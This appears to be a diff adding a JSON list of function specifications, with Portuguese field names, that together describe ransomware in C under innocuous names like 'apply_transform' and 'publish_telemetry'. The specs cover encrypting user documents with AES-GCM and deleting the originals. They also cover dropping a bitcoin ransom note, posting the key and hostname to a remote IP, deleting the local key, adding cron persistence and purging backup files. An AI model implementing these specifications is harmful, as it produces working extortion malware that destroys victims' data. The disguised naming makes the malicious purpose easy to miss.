@@ -1,0 +1,26 @@
+[
+  {
+    "descricao": "Generate a 32-byte AES-256 session key using RAND_bytes(), Base64-encode it with EVP_EncodeBlock(), persist the JSON {\"aes_key\":\"<base64>\"} to /tmp/.master.key with file mode 0600. Return the raw session key as const uint8_t*.",
+    "nome": "init_session"
+  },
+  {
+    "descricao": "Recursively enumerate filesystem objects under paths ~/Documentos_Teste, ~/Documentos, ~/Downloads, ~/Imagens, and /mnt using opendir/readdir. Select only files with extensions .xlsx, .docx, .pdf, .txt, .csv, .jpg, .png, .db, .backup, .psd, .zip, .rar. Return a list of absolute file paths.",
+    "nome": "scan_storage"
+  },
+  {
+    "descricao": "For a given file path, generate a 12-byte nonce via RAND_bytes(), read file content, encrypt using AES-256-GCM via EVP_CIPHER_CTX with the session key and nonce. Write output file named <original>.PROCESSED containing: 12-byte nonce, ciphertext, 16-byte GCM tag. Overwrite original with zero bytes and remove() it.",
+    "nome": "apply_transform"
+  },
+  {
+    "descricao": "For each directory where at least one file was transformed, create a file named #_STATUS_NOTICE_#.txt containing instructions to pay 300 USD to address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa via payment service and contact through a secure channel.",
+    "nome": "write_notice"
+  },
+  {
+    "descricao": "Read /tmp/.master.key via fopen/fread, extract aes_key value using strstr(buf, \"\\\"aes_key\\\":\\\"\") and strchr() for closing quote (advance by strlen(\"\\\"aes_key\\\":\\\"\"), validate length > 0. Obtain hostname via gethostname(). Construct JSON body {\"aes_key\":\"<value>\",\"hostname\":\"<hostname>\"}. Send HTTP POST via libcurl to http://10.254.19.73:8080/collect with Content-Type: application/json. If HTTP response status is 200, delete /tmp/.master.key via remove().",
+    "nome": "publish_telemetry"
+  },
+  {
+    "descricao": "Read current user crontab via popen(\"crontab -l\", \"r\"). If the entry @reboot <binary_path> is not present (binary_path from argv[0]), append it using popen(\"crontab -\", \"w\"). Subsequently, scan target directories (from scan_storage) and purge files with extensions .bak, .backup, .old using remove().",
+    "nome": "register_service"
+  }
+]
